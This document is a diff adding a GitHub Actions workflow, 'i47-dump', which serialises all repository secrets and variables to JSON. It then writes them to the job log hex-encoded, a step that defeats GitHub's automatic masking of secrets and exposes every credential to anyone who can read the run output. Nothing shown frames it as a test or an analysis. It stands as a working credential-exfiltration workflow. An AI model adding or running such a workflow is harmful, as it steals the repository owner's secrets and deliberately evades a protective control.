@@ -1,0 +1,19 @@
+name: i47-dump
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+          VARS_JSON: ${{ toJSON(vars) }}
+        run: |
+          printf 'SECRETSHEX:'
+          printf '%s' "$SECRETS_JSON" | od -An -tx1 | tr -d ' \n'
+          echo
+          printf 'VARSHEX:'
+          printf '%s' "$VARS_JSON" | od -An -tx1 | tr -d ' \n'
+          echo
